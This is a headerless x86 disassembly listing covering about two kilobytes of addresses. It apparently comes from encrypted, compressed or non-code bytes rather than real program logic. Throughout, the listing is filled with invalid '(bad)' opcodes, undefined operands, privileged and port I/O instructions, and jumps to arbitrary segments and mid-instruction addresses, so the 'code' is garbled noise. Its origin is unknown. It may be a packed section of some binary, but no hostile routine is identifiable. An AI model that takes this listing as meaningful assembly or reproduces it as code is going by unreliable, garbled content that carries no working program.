  406bbe:	lods   al,BYTE PTR ds:[esi]
  406bbf:	scas   eax,DWORD PTR es:[edi]
  406bc0:	sub    BYTE PTR [esi-0x62],dl
  406bc3:	push   0x7995e60d
  406bc8:	inc    esp
  406bc9:	mov    ecx,0xdf35e5e
  406bce:	loope  0x406b56
  406bd0:	cli    
  406bd1:	adc    DWORD PTR [ecx],ecx
  406bd3:	std    
  406bd4:	sti    
  406bd5:	(bad)  
  406bd6:	xchg   edx,eax
  406bd7:	pop    ss
  406bd8:	sub    BYTE PTR [ecx],ah
  406bda:	push   eax
  406bdb:	pop    es
  406bdc:	out    dx,al
  406bdd:	push   es
  406bde:	fstp   QWORD PTR [edx+0x3dddf11d]
  406be4:	xor    BYTE PTR [ebx+0x75cad479],bl
  406bea:	in     eax,dx
  406beb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bec:	mov    bh,0x15
  406bee:	sub    DWORD PTR [ecx],ebp
  406bf0:	fs in  al,0x92
  406bf3:	fdiv   st,st(4)
  406bf5:	ins    BYTE PTR es:[edi],dx
  406bf6:	dec    edx
  406bf7:	test   bl,dl
  406bf9:	repz mov esp,0x164c13
  406bff:	test   eax,0xaff388a0
  406c04:	sti    
  406c05:	xor    eax,ebp
  406c07:	cmp    eax,0x4844d4d2
  406c0c:	xchg   ebp,eax
  406c0d:	hlt    
  406c0e:	mov    dl,0x25
  406c10:	mov    eax,ds:0x9e38b6f1
  406c15:	ins    DWORD PTR es:[edi],dx
  406c16:	ds sti 
  406c18:	test   ecx,esp
  406c1a:	aaa    
  406c1b:	frstpm(287 only) 
  406c1d:	sbb    eax,DWORD PTR [ebx-0x2da4986d]
  406c23:	push   0xb3603515
  406c28:	push   0xfffffff9
  406c2a:	mov    dh,0x59
  406c2c:	xchg   esi,eax
  406c2d:	sub    eax,0x26a0622e
  406c32:	inc    edi
  406c33:	or     bh,ch
  406c35:	mov    bl,0x97
  406c37:	pop    ebx
  406c38:	jbe    0x406bef
  406c3a:	test   al,0xe5
  406c3c:	cmp    bl,BYTE PTR [edi]
  406c3e:	and    al,0xf3
  406c40:	dec    edx
  406c41:	nop
  406c42:	iret   
  406c43:	inc    esp
  406c44:	retf   0x2115
  406c47:	inc    eax
  406c48:	rcr    DWORD PTR [edx-0x5c11dcd1],0x3
  406c4f:	fcom   st(1)
  406c51:	mov    esi,?
  406c53:	mov    edx,ebp
  406c55:	inc    BYTE PTR [ecx-0x4c]
  406c58:	mov    WORD PTR [esi],ss
  406c5a:	repnz cmp eax,0x1302c65a
  406c60:	sub    BYTE PTR [edi-0x6bf01d59],ah
  406c66:	xchg   BYTE PTR ds:[edx+0x67],dh
  406c6a:	or     DWORD PTR [ecx],0xfbb3d339
  406c70:	fstp   DWORD PTR [edx]
  406c72:	push   ds
  406c73:	dec    edx
  406c74:	mov    ebp,DWORD PTR [eax-0x3224f4a8]
  406c7a:	xchg   edi,eax
  406c7b:	dec    edi
  406c7c:	ficom  WORD PTR [edx+ecx*1]
  406c7f:	pop    ebx
  406c80:	call   0x921d5617
  406c85:	(bad)  
  406c87:	leave  
  406c88:	aad    0x7
  406c8a:	and    eax,0x5c9f0f79
  406c8f:	fldcw  WORD PTR [edx]
  406c91:	cwde   
  406c92:	adc    ah,dl
  406c94:	out    dx,al
  406c95:	out    dx,eax
  406c96:	push   es
  406c97:	and    ebx,DWORD PTR [edx]
  406c99:	loope  0x406cbd
  406c9b:	mov    bl,0x38
  406c9d:	xor    DWORD PTR [ebx],0xffffffa7
  406ca0:	jae    0x406c68
  406ca2:	cwde   
  406ca3:	inc    esi
  406ca4:	in     al,0xa
  406ca6:	jns    0x406cc7
  406ca8:	std    
  406ca9:	popf   
  406caa:	xchg   ebx,eax
  406cab:	sbb    ecx,DWORD PTR [edi-0x33]
  406cae:	xor    ebx,DWORD PTR [ebx+0x61]
  406cb1:	xor    eax,0x98b98737
  406cb6:	mov    esi,0xf282c98
  406cbb:	jecxz  0x406d3c
  406cbd:	cmp    eax,0x12ae1859
  406cc2:	jae    0x406d0d
  406cc4:	push   esp
  406cc5:	dec    ecx
  406cc6:	std    
  406cc7:	sub    dh,BYTE PTR [ebx-0x1fb0469]
  406ccd:	mov    ecx,DWORD PTR [eax+edx*8]
  406cd0:	jmp    0x72ef:0x26796f7d
  406cd7:	xchg   DWORD PTR ds:0xe3ab7134,esp
  406cdd:	adc    ebx,esi
  406cdf:	ins    BYTE PTR es:[edi],dx
  406ce0:	xor    esi,DWORD PTR [edi]
  406ce2:	mov    cl,BYTE PTR [edi+0x11b0f638]
  406ce8:	adc    bl,bh
  406cea:	sub    al,0x3d
  406cec:	shr    BYTE PTR [edi],1
  406cee:	ss gs inc esi
  406cf1:	mov    bh,0x9b
  406cf3:	mov    cl,0x5
  406cf5:	xlat   BYTE PTR ds:[ebx]
  406cf6:	jge    0x406c7d
  406cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cfa:	sbb    eax,0xbe94e3d5
  406cff:	in     al,0x4b
  406d01:	loope  0x406d44
  406d03:	scas   al,BYTE PTR es:[edi]
  406d04:	adc    ebx,DWORD PTR ds:0x12e1ca63
  406d0a:	xchg   ebx,eax
  406d0b:	pushf  
  406d0c:	mov    bl,0x67
  406d0e:	loop   0x406ccb
  406d10:	ja     0x406c9d
  406d12:	push   esi
  406d13:	bound  ebx,QWORD PTR [eax]
  406d15:	fisubr DWORD PTR [edx-0x42]
  406d18:	dec    esp
  406d19:	push   ebx
  406d1a:	mov    WORD PTR [edi+0x46],ds
  406d1d:	mov    edi,0x99728cf
  406d22:	dec    ebp
  406d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d24:	cmp    BYTE PTR [eax],0x5
  406d27:	cwde   
  406d28:	(bad)  
  406d29:	push   0x53c3efb2
  406d2e:	or     BYTE PTR [edx+0x7b34fe76],ah
  406d34:	add    BYTE PTR [edi+edi*2+0x51bd4771],0xb8
  406d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d3d:	push   es
  406d3e:	xchg   ebx,eax
  406d3f:	cmp    esi,DWORD PTR [eax+edx*4]
  406d42:	ret    0x1ec1
  406d45:	push   edi
  406d46:	fcomp  QWORD PTR [ecx-0x43]
  406d49:	test   DWORD PTR [ebp+0x419c5d26],edi
  406d4f:	jbe    0x406d33
  406d51:	test   al,0x16
  406d53:	fwait
  406d54:	dec    esi
  406d55:	aad    0xd8
  406d57:	cmp    ebx,DWORD PTR [esi-0x766587a4]
  406d5d:	imul   ebx,DWORD PTR [eax+0x687499ba],0x824156c8
  406d67:	mov    fs,WORD PTR [esi]
  406d69:	push   edi
  406d6a:	or     dh,BYTE PTR [ecx-0x3]
  406d6d:	mov    ch,0x8c
  406d6f:	mov    WORD PTR gs:[edx+0x33543d68],fs
  406d76:	bnd jl 0x406d6d
  406d79:	xchg   DWORD PTR [edx+0x4],ebx
  406d7c:	mov    bh,0xab
  406d7e:	fnstenv [ecx+ecx*4+0x19]
  406d82:	test   eax,0xfee3d0d2
  406d87:	sub    eax,0x59070f6
  406d8c:	(bad)  
  406d8e:	jl     0x406d21
  406d90:	std    
  406d91:	into   
  406d92:	add    al,0xa8
  406d94:	popf   
  406d95:	(bad)  
  406d96:	sub    DWORD PTR [ecx],eax
  406d98:	mov    BYTE PTR [esi+0x70],0x26
  406d9c:	std    
  406d9d:	test   eax,0x702044d2
  406da2:	jecxz  0x406d45
  406da4:	dec    edi
  406da5:	lock fs mov ebx,0xcd32b921
  406dac:	fstp   DWORD PTR ds:0x9f7f9fb9
  406db2:	adc    DWORD PTR [ebx-0x79ed777a],ecx
  406db8:	arpl   cx,cx
  406dba:	jne    0x406da3
  406dbc:	mov    cs,esp
  406dbe:	mov    edx,0xf95ac08
  406dc3:	sbb    eax,0x7b32a49f
  406dc8:	cwde   
  406dc9:	cwde   
  406dca:	mov    ch,0xe4
  406dcc:	iret   
  406dcd:	add    eax,0x731ec42e
  406dd2:	xchg   ebx,eax
  406dd3:	mov    edi,0x41230f67
  406dd8:	xor    ecx,DWORD PTR [edx-0x6b]
  406ddb:	inc    esp
  406ddc:	(bad)  
  406ddd:	jecxz  0x406df0
  406ddf:	xchg   edi,eax
  406de0:	and    eax,0xd7f762f7
  406de5:	repz pop ecx
  406de7:	imul   BYTE PTR [edx]
  406de9:	pop    ebx
  406dea:	adc    eax,0xf6192380
  406def:	adc    esi,DWORD PTR [ebp+ebp*1+0x57b14db8]
  406df6:	cmp    ah,cl
  406df8:	pop    ecx
  406df9:	cwde   
  406dfa:	add    BYTE PTR [ebp-0x4320f783],ah
  406e00:	arpl   WORD PTR [eax-0xa],di
  406e03:	rcl    bh,1
  406e05:	pop    ebx
  406e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e07:	imul   esi,DWORD PTR [edx],0x3b
  406e0a:	pop    ebp
  406e0b:	push   0xffffffe3
  406e0d:	xchg   edx,eax
  406e0e:	push   ebp
  406e0f:	push   ebp
  406e10:	scas   eax,DWORD PTR es:[edi]
  406e11:	sahf   
  406e12:	outs   dx,BYTE PTR ds:[esi]
  406e13:	xchg   edx,eax
  406e14:	repz jmp 0x5749e70c
  406e1a:	add    al,0xe4
  406e1c:	jecxz  0x406e32
  406e1e:	mov    bl,0xf7
  406e20:	data16 add BYTE PTR [edi+0x18],0x63
  406e25:	xchg   esi,eax
  406e26:	stos   BYTE PTR es:[edi],al
  406e27:	sub    DWORD PTR [ebx+eiz*2-0x36ecd33f],edx
  406e2e:	mov    edi,eax
  406e30:	dec    edx
  406e31:	adc    bl,BYTE PTR [edx]
  406e33:	and    DWORD PTR [ecx+0x49],esi
  406e36:	test   BYTE PTR [esi],ah
  406e38:	fimul  WORD PTR [edi-0x34]
  406e3b:	xchg   BYTE PTR [eax],dh
  406e3d:	hlt    
  406e3e:	les    ebp,FWORD PTR [ebp+0x1c]
  406e41:	mov    ebp,0x8c30d273
  406e46:	lock or DWORD PTR [esp+eiz*8+0x6a],0xfffffffc
  406e4c:	popf   
  406e4d:	dec    ecx
  406e4e:	mov    ecx,edx
  406e50:	adc    DWORD PTR [edi],esp
  406e52:	out    0x42,al
  406e54:	fucomi st,st(3)
  406e56:	aas    
  406e57:	out    0xe7,eax
  406e59:	adc    bl,BYTE PTR [ecx]
  406e5b:	push   esi
  406e5c:	mov    edi,0x74828c23
  406e61:	bound  esp,QWORD PTR [edi]
  406e63:	mov    dl,0x41
  406e65:	jno    0x406eb3
  406e67:	(bad)  
  406e68:	(bad)  
  406e6a:	mov    al,ds:0x5f3d9770
  406e6f:	xchg   esi,eax
  406e70:	inc    esp
  406e71:	cmp    ebx,DWORD PTR [edx]
  406e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e74:	add    ebx,DWORD PTR [ecx-0x18]
  406e77:	xor    al,0xbc
  406e79:	mov    ss,esi
  406e7b:	jle    0x406e87
  406e7d:	pusha  
  406e7e:	ins    BYTE PTR es:[edi],dx
  406e7f:	jb     0x406e27
  406e81:	mov    edi,0x21871baa
  406e86:	rcl    DWORD PTR ds:0xfad49245,cl
  406e8c:	jmp    0xd083:0xc1a0fd9
  406e93:	aas    
  406e94:	lahf   
  406e95:	and    BYTE PTR [edx+edi*1-0x78948c7f],ch
  406e9c:	cmp    eax,0xc628d63
  406ea1:	pop    edx
  406ea2:	ror    BYTE PTR ds:0x57000eb4,0xa
  406ea9:	idiv   ecx
  406eab:	addr16 dec edx
  406ead:	lahf   
  406eae:	mov    ebp,0x36ae4918
  406eb3:	mov    edi,0xb3f99eb2
  406eb8:	call   0xe20a0605
  406ebd:	and    DWORD PTR [eax+0x3d],0x17368601
  406ec4:	jae    0x406f34
  406ec6:	pop    ebx
  406ec7:	ins    BYTE PTR es:[edi],dx
  406ec8:	adc    al,0x14
  406eca:	jg     0x406f2e
  406ecc:	xchg   esi,eax
  406ecd:	xchg   ecx,eax
  406ece:	push   ds
  406ecf:	jnp    0x406f36
  406ed1:	adc    BYTE PTR [ecx+0x16afdbce],bl
  406ed7:	add    eax,0xcc884f80
  406edc:	inc    ebp
  406edd:	xlat   BYTE PTR ds:[ebx]
  406ede:	fcmove st,st(5)
  406ee0:	cld    
  406ee1:	dec    ebx
  406ee2:	jno    0x406ed7
  406ee4:	push   edi
  406ee5:	pop    eax
  406ee6:	xchg   esp,eax
  406ee7:	fsub   st,st(7)
  406ee9:	push   0xf2bb0af5
  406eee:	xchg   esi,eax
  406eef:	pop    es
  406ef0:	scas   eax,DWORD PTR es:[edi]
  406ef1:	sar    DWORD PTR [edi],cl
  406ef3:	mov    ebx,0x2b0bed5b
  406ef8:	arpl   WORD PTR [ebp-0x32],ax
  406efb:	hlt    
  406efc:	mov    dh,BYTE PTR ds:0xc1f8f62b
  406f02:	inc    esp
  406f03:	loop   0x406e85
  406f05:	jle    0x406f32
  406f07:	js     0x406e94
  406f09:	in     al,dx
  406f0a:	jne    0x406ea4
  406f0c:	push   edx
  406f0d:	jo     0x406f7a
  406f0f:	cmp    BYTE PTR ds:0x69465d5c,dl
  406f15:	fisubr DWORD PTR ds:[esi+0x77b3b003]
  406f1c:	xor    BYTE PTR [edi-0x4c],dl
  406f1f:	repnz cmp BYTE PTR [edi],0xc
  406f23:	mov    BYTE PTR [edi],0x40
  406f26:	dec    edx
  406f27:	fst    DWORD PTR [esi]
  406f29:	pop    ebx
  406f2a:	and    eax,0xe76197a8
  406f2f:	pop    es
  406f30:	retf   
  406f31:	repnz dec esp
  406f33:	push   eax
  406f34:	and    DWORD PTR [ecx],esp
  406f36:	inc    edi
  406f37:	adc    dl,BYTE PTR ds:0x637f4953
  406f3d:	pop    esp
  406f3e:	fild   QWORD PTR [edi]
  406f40:	leave  
  406f41:	xchg   DWORD PTR [esp+esi*8],ebp
  406f44:	icebp  
  406f45:	jo     0x406fbe
  406f47:	leave  
  406f48:	or     bh,BYTE PTR [ebp+edi*4-0x6f]
  406f4c:	cmp    ebp,DWORD PTR [ebp+0x60675403]
  406f52:	int    0x58
  406f54:	(bad)  
  406f55:	jnp    0x406f78
  406f57:	push   eax
  406f58:	jp     0x406f08
  406f5a:	cli    
  406f5b:	or     ebp,DWORD PTR [edx]
  406f5d:	stc    
  406f5e:	push   eax
  406f5f:	aas    
  406f60:	ret    0xf8b8
  406f63:	sbb    al,0x68
  406f65:	dec    ecx
  406f66:	in     al,0x1a
  406f68:	mov    cl,0x36
  406f6a:	loopne 0x406f61
  406f6c:	mov    ebp,es
  406f6e:	adc    ch,BYTE PTR [edi]
  406f70:	dec    ebp
  406f71:	push   ebx
  406f72:	adc    eax,0x9b6e4717
  406f77:	daa    
  406f78:	les    ebx,FWORD PTR [edx]
  406f7a:	xchg   ebx,eax
  406f7b:	push   ebx
  406f7c:	(bad)  
  406f7e:	xor    eax,0x540da4aa
  406f83:	mov    dh,BYTE PTR [esi+eax*8-0x540cc044]
  406f8a:	xor    al,0x1e
  406f8c:	mov    eax,0x2a0fbab7
  406f91:	push   DWORD PTR [ecx+eax*2]
  406f94:	ret    
  406f95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f96:	cli    
  406f97:	mov    ss,WORD PTR [ebx+0x59e4f81e]
  406f9d:	jg     0x406f70
  406f9f:	or     al,0xaa
  406fa1:	or     BYTE PTR [ebp+edi*8-0x11],cl
  406fa5:	nop    DWORD PTR [esi+eiz*2+0xb7bd541]
  406fad:	mov    al,ds:0x5b42e27d
  406fb2:	shl    DWORD PTR [edi-0x13],cl
  406fb5:	dec    ebp
  406fb6:	cmp    DWORD PTR [eax-0x20ee6b14],esi
  406fbc:	xchg   BYTE PTR [ebp-0x24],dh
  406fbf:	jmp    0x406fed
  406fc1:	aas    
  406fc2:	jg     0x406f83
  406fc4:	sub    eax,0x9b608c65
  406fc9:	inc    edi
  406fca:	push   edi
  406fcb:	mov    ebp,0x4e146585
  406fd0:	lods   al,BYTE PTR ds:[esi]
  406fd1:	outs   dx,DWORD PTR ds:[esi]
  406fd2:	xor    bl,BYTE PTR [edi-0x33c74fe]
  406fd8:	bnd jae 0x407028
  406fdb:	xchg   edi,eax
  406fdc:	loop   0x40703f
  406fde:	(bad)  
  406fdf:	pop    esp
  406fe0:	popa   
  406fe1:	push   eax
  406fe2:	pusha  
  406fe3:	xchg   edi,eax
  406fe4:	or     dh,BYTE PTR [eax+0x47a42051]
  406fea:	mov    ds:0x37c61e0d,eax
  406fef:	xchg   esp,eax
  406ff0:	ret    
  406ff1:	cld    
  406ff2:	mov    bh,0x9c
  406ff4:	shl    BYTE PTR [ebx],0xf1
  406ff7:	call   0xccb1:0xdc4c203f
  406ffe:	jge    0x407006
  407000:	pop    edi
  407001:	or     edx,esp
  407003:	sub    dl,0x75
  407006:	mov    esi,gs
  407008:	dec    ebx
  407009:	shl    ebx,1
  40700b:	pop    es
  40700c:	pop    ss
  40700d:	inc    eax
  40700e:	int    0x64
  407010:	cmc    
  407011:	into   
  407012:	sub    edi,DWORD PTR [esi-0xf]
  407015:	pop    ebp
  407016:	jbe    0x407060
  407018:	xor    ebx,ecx
  40701a:	pop    edi
  40701b:	mov    ebx,0xf6f79526
  407020:	iret   
  407021:	xor    cl,BYTE PTR [esi]
  407023:	shl    DWORD PTR [eax-0x634e784c],cl
  407029:	fisttp WORD PTR [esi-0x15]
  40702c:	rcr    ch,0x3b
  40702f:	daa    
  407030:	jp     0x406fdc
  407032:	je     0x406fbd
  407034:	xchg   ebp,eax
  407035:	repz dec ebx
  407037:	jbe    0x4070a7
  407039:	xchg   DWORD PTR [edi+esi*4+0x20d6b650],esp
  407040:	push   edx
  407041:	ja     0x406fe6
  407043:	inc    edi
  407044:	inc    edx
  407045:	sbb    al,0x1c
  407047:	in     eax,dx
  407048:	sti    
  407049:	ret    0xa141
  40704c:	push   ebx
  40704d:	add    dh,BYTE PTR [edi+0x5c]
  407050:	inc    eax
  407051:	xchg   ecx,eax
  407052:	push   ss
  407053:	jns    0x40700a
  407055:	dec    edx
  407056:	test   DWORD PTR [ebx+edi*2-0x63fb11fe],edi
  40705d:	adc    ecx,DWORD PTR [edi+0x56]
  407060:	popa   
  407061:	add    dh,BYTE PTR es:[edi+0x40112a6a]
  407068:	sub    al,0x23
  40706a:	inc    edi
  40706b:	sub    al,0xd5
  40706d:	xor    al,0x75
  40706f:	clc    
  407070:	je     0x4070e0
  407072:	or     edi,edi
  407074:	shl    BYTE PTR [ebx-0x6631bd0],0x3f
  40707b:	and    esi,eax
  40707d:	or     DWORD PTR [edx+0x34],0xae490870
  407084:	ins    BYTE PTR es:[edi],dx
  407085:	(bad)
  407089:	push   esi
  40708a:	(bad)
  40708e:	outs   dx,BYTE PTR ds:[esi]
  40708f:	mov    ?,WORD PTR [ebx+0x5013e7e5]
  407095:	mov    eax,0x16d644cf
  40709a:	test   al,0x2
  40709c:	and    al,0xff
  40709e:	pusha  
  40709f:	sbb    DWORD PTR [eax-0x6cc295e6],ebx
  4070a5:	lahf   
  4070a6:	sub    BYTE PTR [edx],al
  4070a8:	mov    cl,0xdb
  4070aa:	xchg   edi,eax
  4070ab:	cmp    BYTE PTR [ecx],bh
  4070ad:	test   al,0xb6
  4070af:	mov    ds:0xab047036,al
  4070b4:	dec    esp
  4070b5:	loop   0x4070da
  4070b7:	sbb    ah,dh
  4070b9:	sbb    esi,DWORD PTR [edx+0x70]
  4070bc:	mov    al,0xaa
  4070be:	adc    BYTE PTR [eax],dl
  4070c0:	in     al,0x58
  4070c2:	fist   DWORD PTR [ecx-0x4e]
  4070c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070c6:	aam    0x1
  4070c8:	sar    dh,cl
  4070ca:	pop    ds
  4070cb:	cmp    al,0x76
  4070cd:	nop
  4070ce:	xchg   ecx,eax
  4070cf:	xor    BYTE PTR [esi+0x6e17264e],dh
  4070d5:	out    0xda,eax
  4070d7:	inc    esp
  4070d8:	aad    0x49
  4070da:	sub    ecx,DWORD PTR [esi]
  4070dc:	shl    DWORD PTR ds:0xfccc0141,1
  4070e2:	push   ecx
  4070e3:	test   eax,0xe39ac829
  4070e8:	adc    dh,ah
  4070ea:	enter  0x764,0x6a
  4070ee:	fcomp  DWORD PTR [eax-0x433bc7b8]
  4070f4:	jl     0x4070c5
  4070f6:	sbb    cl,BYTE PTR [ebp-0x4aed0d83]
  4070fc:	mov    al,ds:0xe9418a89
  407101:	shl    ebp,cl
  407103:	iret   
  407104:	stos   DWORD PTR es:[edi],eax
  407105:	pushf  
  407106:	jb     0x4070bc
  407108:	sub    BYTE PTR [ebx+eiz*1],bl
  40710b:	mov    DWORD PTR [ebx+0x2e97cb48],edx
  407111:	mov    al,ds:0x66bc341a
  407116:	or     edi,DWORD PTR [ebx]
  407118:	mov    ebp,ebp
  40711a:	pop    edi
  40711b:	xlat   BYTE PTR ds:[ebx]
  40711c:	pop    eax
  40711d:	loop   0x40715a
  40711f:	in     al,0x3d
  407121:	push   edx
  407122:	jmp    0x40718f
  407124:	mov    ds:0x55e0fdca,al
  407129:	xchg   ebp,eax
  40712a:	xchg   edi,eax
  40712b:	xor    ebp,DWORD PTR ds:0xdc8ffec2
  407131:	in     eax,dx
  407132:	push   eax
  407133:	xchg   ecx,eax
  407134:	mov    eax,0xcd3086cf
  407139:	push   esp
  40713a:	inc    ebx
  40713b:	aad    0xe8
  40713d:	ins    DWORD PTR es:[edi],dx
  40713e:	or     DWORD PTR [esi],ebx
  407140:	xchg   ecx,eax
  407141:	jo     0x40710e
  407143:	inc    eax
  407144:	sbb    BYTE PTR [ecx-0x62],al
  407147:	(bad)  
  407148:	je     0x4071c8
  40714a:	mov    BYTE PTR [esi+0x33],ch
  40714d:	jne    0x4071b5
  40714f:	jne    0x4070f1
  407151:	and    al,0x89
  407153:	jbe    0x4070e8
  407155:	push   edi
  407156:	retf   0x3312
  407159:	pand   mm4,mm4
  40715c:	dec    eax
  40715d:	and    al,0x24
  40715f:	push   ebp
  407160:	mov    eax,ds:0xb0bb1439
  407165:	enter  0x74c6,0xe1
  407169:	adc    esi,esi
  40716b:	sbb    edx,DWORD PTR [edi+edx*4+0x3e]
  40716f:	sbb    ebp,DWORD PTR [ecx]
  407171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407172:	fistp  DWORD PTR [ecx]
  407174:	lods   eax,DWORD PTR ds:[esi]
  407175:	push   edi
  407176:	pop    ds
  407177:	int    0x36
  407179:	fisttp WORD PTR [ebp-0x4b639b92]
  40717f:	cli    
  407180:	sbb    al,0x2a
  407182:	pop    es
  407183:	fdivr  DWORD PTR [ecx]
  407185:	icebp  
  407186:	cli    
  407187:	xor    dh,BYTE PTR [ebp-0x19129c5a]
  40718d:	not    DWORD PTR [esi+0x5e]
  407190:	xchg   ecx,eax
  407191:	cdq    
  407192:	dec    eax
  407193:	arpl   WORD PTR [edi],cx
  407195:	pop    ss
  407196:	push   esi
  407197:	pop    esp
  407198:	push   eax
  407199:	lods   al,BYTE PTR ds:[esi]
  40719a:	test   al,0xf
  40719c:	push   cs
  40719d:	mov    esi,DWORD PTR [edx-0xf]
  4071a0:	in     al,dx
  4071a1:	lmsw   bx
  4071a4:	xlat   BYTE PTR ds:[ebx]
  4071a5:	mov    DWORD PTR [esi+0x13cbeaac],edx
  4071ab:	dec    edi
  4071ac:	imul   ecx,DWORD PTR [esi+0x6d5efbeb],0x51
  4071b3:	sbb    eax,0xdbe45ff4
  4071b8:	mov    DWORD PTR [ebx],edx
  4071ba:	pop    ecx
  4071bb:	not    DWORD PTR [eax+ecx*1]
  4071be:	or     dl,BYTE PTR [esi]
  4071c0:	gs jno 0x4071bc
  4071c3:	ja     0x40723c
  4071c5:	cs dec ecx
  4071c7:	sbb    bl,BYTE PTR [esi+0x585a7e06]
  4071cd:	scas   al,BYTE PTR es:[edi]
  4071ce:	pop    ss
  4071cf:	jno    0x4071d1
  4071d1:	push   edi
  4071d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d3:	jle    0x407158
  4071d5:	fs test al,0x5c
  4071d8:	dec    ebx
  4071da:	jno    0x407209
  4071dc:	pop    eax
  4071dd:	ror    DWORD PTR [edx+ebx*8+0x16e12ad9],cl
  4071e4:	iret   
  4071e5:	mov    ds:0xda167ed3,al
  4071ea:	or     ecx,DWORD PTR [esi+0x6c868c04]
  4071f0:	test   al,0xb5
  4071f2:	adc    ecx,eax
  4071f4:	je     0x407179
  4071f6:	cmp    bl,dl
  4071f8:	loop   0x407188
  4071fa:	push   edi
  4071fb:	iret   
  4071fc:	jb     0x407191
  4071fe:	test   eax,0xa9fd6c62
  407203:	psubsw mm2,QWORD PTR [esi]
  407206:	in     al,dx
  407207:	popa   
  407208:	bnd jo 0x407282
  40720b:	inc    esi
  40720c:	push   ss
  40720d:	sub    edi,DWORD PTR [eax]
  40720f:	stos   BYTE PTR es:[edi],al
  407210:	push   ebp
  407211:	mov    ds:0x8e8e57ce,eax
  407216:	div    ebp
  407218:	xor    DWORD PTR [edi],0x54401355
  40721e:	and    al,BYTE PTR [esp+eax*2+0x38]
  407222:	xchg   esi,eax
  407223:	cld    
  407224:	iret   
  407225:	enter  0x780b,0xb7
  407229:	lods   eax,DWORD PTR ds:[esi]
  40722a:	jecxz  0x407230
  40722c:	bound  ebx,QWORD PTR [edx+ecx*1]
  40722f:	or     cl,0xb8
  407232:	sti    
  407233:	shr    BYTE PTR ds:0xfc7c3d09,1
  407239:	and    edx,edx
  40723b:	mov    BYTE PTR [edx-0x54],al
  40723e:	mov    eax,0x48f2e760
  407243:	xor    DWORD PTR [ecx+eax*4+0x4f3da3cd],esi
  40724a:	mov    ah,0x2a
  40724c:	rcl    DWORD PTR [ecx+eiz*8-0x38],0x87
  407251:	idiv   BYTE PTR [esi-0x5f]
  407254:	fwait
  407255:	mov    ?,WORD PTR [eax+0x14]
  407258:	into   
  407259:	pusha  
  40725a:	test   DWORD PTR [ebp-0x1d9a0efd],edx
  407260:	clc    
  407261:	jle    0x407200
  407263:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407264:	cld    
  407265:	mov    cl,ch
  407267:	sahf   
  407268:	push   edx
  407269:	or     BYTE PTR [ebx+0x6],ch
  40726c:	adc    al,0x83
  40726e:	and    eax,0xa211e31a
  407273:	dec    ebp
  407274:	or     DWORD PTR [edx-0x5d],ebp
  407277:	addr16 call 0xf12f:0xb5e3a6f1
  40727f:	add    BYTE PTR [eax+ebx*1],dh
  407282:	add    ah,BYTE PTR [ecx+0x55287b96]
  407288:	sub    edi,esp
  40728a:	jae    0x4072fe
  40728c:	mov    bl,0x9e
  40728e:	sub    al,0x12
  407290:	imul   eax,DWORD PTR [ebx-0x41],0x39
  407294:	push   esi
  407295:	idiv   DWORD PTR [ebx+0x7]
  407298:	jne    0x407277
  40729a:	jmp    0x40730b
  40729c:	mov    esi,0xbcad7eb0
  4072a1:	push   es
  4072a2:	sbb    eax,0x49d96328
  4072a7:	inc    ebx
  4072a8:	js     0x4072db
  4072aa:	adc    al,0x35
  4072ac:	dec    eax
  4072ad:	sbb    esp,DWORD PTR [edi]
  4072af:	les    edi,FWORD PTR [ecx-0x51]
  4072b2:	mov    ecx,0xd1e17be7
  4072b7:	dec    edi
  4072b8:	loop   0x407298
  4072ba:	pop    edx
  4072bb:	adc    eax,0xe206919e
  4072c0:	add    ch,BYTE PTR [eax+ebx*4+0x19cd044]
  4072c7:	das    
  4072c8:	gs mov dl,0x33
  4072cb:	xchg   esp,eax
  4072cc:	xor    eax,0xfa54f687
  4072d1:	cmc    
  4072d2:	xor    al,0x53
  4072d4:	mov    ch,0x43
  4072d6:	repnz pop es
  4072d8:	rcr    DWORD PTR [esi],cl
  4072da:	jl     0x40731f
  4072dc:	or     eax,0x1b36ae91
  4072e1:	in     eax,dx
  4072e2:	jno    0x4072bc
  4072e4:	loop   0x407272
  4072e6:	fist   WORD PTR [ecx-0x33fc3b9]
  4072ec:	jo     0x407346
  4072ee:	hlt    
  4072ef:	loope  0x4072c6
  4072f1:	or     edi,ecx
  4072f3:	test   eax,0xd2a47d90
  4072f8:	out    dx,eax
  4072f9:	xchg   edx,eax
  4072fa:	dec    BYTE PTR [ebx+0x70]
  4072fd:	xor    bl,ch
  4072ff:	mov    esi,0xc00f2853
  407304:	push   ss
  407305:	aaa    
  407306:	dec    ebx
  407307:	mov    eax,ds:0xb57cb799
  40730c:	repz xchg edi,eax
  40730e:	push   esi
  40730f:	in     al,dx
  407310:	pop    esi
  407311:	jmp    0x900d:0xf0db1a55
  407318:	add    edx,DWORD PTR [esi+0x5a]
  40731b:	retf   
  40731c:	(bad)  
  40731d:	push   esp
  40731e:	mov    al,0xc1
  407320:	xchg   BYTE PTR [ecx+0x5b],dh
  407323:	clc    
  407324:	jle    0x4072b8
  407326:	in     eax,0xc6
  407328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407329:	adc    DWORD PTR [ebx],esi
  40732b:	cmc    
  40732c:	mov    eax,ds:0x2fbedb2b
  407331:	dec    ebp
  407332:	pushw  ds
  407334:	leave  
  407335:	cmp    DWORD PTR [ecx+0x2e32c887],ecx
  40733b:	or     BYTE PTR [ecx+edi*8],0x16
  40733f:	pop    esi
  407340:	cmp    ebp,DWORD PTR [eax-0x7e]
  407343:	cwde   
  407344:	fnsave [eax+ebp*4-0x4f]
  407348:	mov    bl,0x5
  40734a:	in     eax,dx
  40734b:	xchg   BYTE PTR [edx+0x30],dh
  40734e:	or     dl,ah
  407350:	dec    edi
  407351:	js     0x4073b2
  407353:	dec    ebx
  407354:	sar    DWORD PTR [eax],cl
  407356:	ret    
  407357:	sbb    BYTE PTR [edi+0x7c],dh
